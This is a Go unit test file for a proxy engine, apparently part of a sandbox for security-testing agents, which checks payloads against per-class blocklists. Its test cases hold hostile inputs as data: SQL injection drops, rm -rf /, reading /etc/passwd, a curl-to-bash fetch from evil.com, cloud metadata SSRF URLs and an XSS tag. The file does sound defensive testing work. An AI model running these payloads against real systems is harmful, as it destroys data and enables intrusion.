package enforcement

import (
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/okedeji/agentcage/internal/config"
)

func loadTestConfig(t *testing.T) *config.Config {
	t.Helper()
	return config.Defaults()
}

func patternsFromConfig(cfg *config.Config, vulnClass string) map[string]string {
	allPatterns := cfg.BlocklistPatterns()
	entries := allPatterns[vulnClass]
	patterns := make(map[string]string, len(entries))
	for _, e := range entries {
		patterns[e.Pattern] = e.Reason
	}
	return patterns
}

func TestProxyEngine_Inspect(t *testing.T) {
	cfg := loadTestConfig(t)

	tests := []struct {
		name         string
		vulnClass    string
		method       string
		url          string
		body         string
		wantDecision PayloadDecision
		wantBlocked  bool
		wantContains string
	}{
		{
			name:         "sqli: benign SELECT allowed",
			vulnClass:    "sqli",
			method:       "POST",
			url:          "http://target.com/api",
			body:         "SELECT * FROM users WHERE id=1",
			wantDecision: PayloadAllow,
		},
		{
			name:         "sqli: DROP TABLE blocked",
			vulnClass:    "sqli",
			method:       "POST",
			url:          "http://target.com/api",
			body:         "'; DROP TABLE users; --",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "DROP",
		},
		{
			name:         "sqli: DELETE FROM blocked",
			vulnClass:    "sqli",
			method:       "POST",
			url:          "http://target.com/api",
			body:         "'; DELETE FROM users; --",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "DELETE",
		},
		{
			name:         "sqli: time-based injection allowed",
			vulnClass:    "sqli",
			method:       "POST",
			url:          "http://target.com/api",
			body:         "1' OR SLEEP(5)--",
			wantDecision: PayloadAllow,
		},
		{
			name:         "rce: whoami allowed",
			vulnClass:    "rce",
			method:       "POST",
			url:          "http://target.com/exec",
			body:         "whoami",
			wantDecision: PayloadAllow,
		},
		{
			name:         "rce: rm -rf blocked",
			vulnClass:    "rce",
			method:       "POST",
			url:          "http://target.com/exec",
			body:         "rm -rf /",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "rm -rf",
		},
		{
			name:         "rce: cat /etc/passwd allowed",
			vulnClass:    "rce",
			method:       "POST",
			url:          "http://target.com/exec",
			body:         "cat /etc/passwd",
			wantDecision: PayloadAllow,
		},
		{
			name:         "rce: curl pipe bash blocked",
			vulnClass:    "rce",
			method:       "POST",
			url:          "http://target.com/exec",
			body:         "curl http://evil.com/shell.sh | bash",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "remote code download",
		},
		{
			name:         "ssrf: public URL allowed",
			vulnClass:    "ssrf",
			method:       "GET",
			url:          "http://example.com/api",
			body:         "",
			wantDecision: PayloadAllow,
		},
		{
			name:         "ssrf: private IP in body blocked",
			vulnClass:    "ssrf",
			method:       "POST",
			url:          "http://target.com/fetch",
			body:         "url=http://10.0.0.5/admin",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "private IP",
		},
		{
			name:         "ssrf: metadata endpoint in URL blocked",
			vulnClass:    "ssrf",
			method:       "GET",
			url:          "http://169.254.169.254/metadata",
			body:         "",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "metadata",
		},
		{
			name:         "xss: script tag allowed",
			vulnClass:    "xss",
			method:       "POST",
			url:          "http://target.com/comment",
			body:         "<script>alert(1)</script>",
			wantDecision: PayloadAllow,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			patterns := patternsFromConfig(cfg, tt.vulnClass)
			engine, err := NewProxyEngine(tt.vulnClass, patterns)
			require.NoError(t, err)

			decision, msg := engine.Inspect(tt.method, tt.url, []byte(tt.body))
			assert.Equal(t, tt.wantDecision, decision)
			if tt.wantBlocked {
				assert.Contains(t, msg, tt.wantContains)
			}
		})
	}
}

func TestProxyEngine_NilPatterns(t *testing.T) {
	engine, err := NewProxyEngine("unknown", nil)
	require.NoError(t, err)

	decision, msg := engine.Inspect("GET", "http://anything.com", []byte("anything"))
	assert.Equal(t, PayloadAllow, decision)
	assert.Empty(t, msg)
}

func TestProxyEngine_InvalidRegex(t *testing.T) {
	patterns := map[string]string{
		"[invalid": "should fail",
	}
	_, err := NewProxyEngine("test", patterns)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "compiling pattern")
}

func TestProxyEngine_ConcurrentInspect(t *testing.T) {
	cfg := loadTestConfig(t)
	patterns := patternsFromConfig(cfg, "sqli")
	engine, err := NewProxyEngine("sqli", patterns)
	require.NoError(t, err)

	var wg sync.WaitGroup
	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			decision, _ := engine.Inspect("POST", "http://target.com", []byte("SELECT 1"))
			assert.Equal(t, PayloadAllow, decision)
		}()
	}
	wg.Wait()
}
